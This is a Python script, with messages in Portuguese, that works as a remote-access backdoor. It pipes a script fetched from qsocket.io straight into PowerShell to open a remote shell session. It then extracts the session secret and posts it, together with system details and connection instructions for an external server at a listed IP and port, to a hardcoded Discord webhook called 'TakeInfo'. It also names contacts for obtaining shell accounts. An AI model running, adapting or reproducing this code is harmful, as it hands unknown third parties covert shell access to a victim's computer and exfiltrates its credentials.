#!/usr/bin/env python3

import subprocess
import re
import requests
import sys
import time
import os
from datetime import datetime

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1545534108178972692/KE8QMZAPw57EPlyE7oJQGwYk4fVO3oR73K41Rt2hTDoVFT7pCOOeA8qs1GKmhur1LsHd"

def executar_qsocket():
    try:
        cmd = 'powershell -Command "irm qsocket.io/1 | iex"'
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=120
        )
        return result.stdout + result.stderr
    except Exception as e:
        return f"[!] Erro: {e}"

def extrair_linhas_qrcode(output):
    linhas = []
    for line in output.splitlines():
        if line.strip().startswith("# >>> Connect"):
            linhas.append(line.strip())
    return linhas

def extrair_secret(linhas):
    for line in linhas:
        match = re.search(r'-s\s+([a-zA-Z0-9]+)', line)
        if match:
            return match.group(1)
    return None

def enviar_para_discord(secret, linhas, webhook_url):
    if not webhook_url or webhook_url == "https://discord.com/api/webhooks/SEU_ID/SEU_TOKEN":
        return False
    
    instrucoes = f"""📌 COMO OBTER ACESSO:

1️⃣ Se NÃO tiver conta:
   • Contate @larphyw no Telegram
   • OU contate kbbdpxrl no Discord
   • Solicite sua conta Qshell

2️⃣ Se já tiver conta:
   • Abra o PuTTY
   • Host: 193.161.193.99
   • Porta: 50520
   • Connection type: Raw
   • Faça login com sua conta
   • Digite: qshell
   • Cole a chave: {secret if secret else 'SUA_CHAVE_AQUI'}"""
    
    message = {
        "username": "TakeInfo",
        "embeds": [
            {
                "title": "🔐 SecretQshell - Chave Gerada",
                "color": 0xff0000,
                "fields": [
                    {
                        "name": "🔑 Sua Chave Qshell",
                        "value": f"`{secret}`" if secret else "`Não disponível`",
                        "inline": False
                    },
                    {
                        "name": "📌 INSTRUÇÕES",
                        "value": f"```\n{instrucoes}\n```",
                        "inline": False
                    },
                    {
                        "name": "🖥️ Informações do Sistema",
                        "value": f"```\n{linhas[0] if linhas else 'N/A'}\n```",
                        "inline": False
                    }
                ],
                "footer": {
                    "text": f"TakeInfo | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                }
            }
        ]
    }
    
    try:
        response = requests.post(webhook_url, json=message)
        return response.status_code == 204
    except:
        return False

def main():
    try:
        print("[*] Executando QSocket...")
        output = executar_qsocket()
        
        print("[*] Extraindo informações...")
        linhas = extrair_linhas_qrcode(output)
        secret = extrair_secret(linhas)
        
        if secret:
            print(f"[+] Secret encontrado: {secret}")
        else:
            print("[-] Nenhum secret encontrado")
        
        print("[*] Enviando para Discord...")
        if enviar_para_discord(secret, linhas, DISCORD_WEBHOOK_URL):
            print("[+] Informações enviadas com sucesso!")
        else:
            print("[-] Falha ao enviar para o Discord")
            
    except KeyboardInterrupt:
        print("\n[!] Interrompido")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Erro: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
